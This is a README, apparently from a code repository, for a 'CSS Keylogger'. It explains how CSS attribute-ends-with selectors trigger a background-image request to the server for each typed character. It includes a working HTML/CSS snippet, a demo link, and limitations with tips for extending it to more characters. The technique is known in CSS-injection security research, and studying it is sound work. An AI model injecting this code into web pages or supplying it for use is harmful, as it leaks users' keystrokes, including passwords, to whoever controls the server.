# CSS Keylogger

Check the [demo](https://codesandbox.io/s/lucid-germain-uxymn?file=/src/index.js)

This is a simple implementation of a keylogger using CSS.
It requires the `value` attribute to be in sync with the input value,
that is why there is a listener `oninput` in the `input` tag.

## How it works
It works by using an [attribute ends with selector](https://www.w3schools.com/cssref/sel_attr_end.asp)
and CSS background images. For instance:

```html
<style>
input[value$=a] {
  background-image: url(/char/a);
}

input[value$=b] {
  background-image: url(/char/b);
}
</style>
<!-- It has first made the request for a, and then the request for b as the user typed -->
<input type="text" value="ab">
```

### Limitations
- This implementations only listens for a-z characters. To trigger the request for more characters, just add them to the alphabet array
- If the user types fast enough, or types the same character twice, the server is not going to be notified
- When typing the same letter twice, the image was already loaded, so no request is made (probably can be fixed)

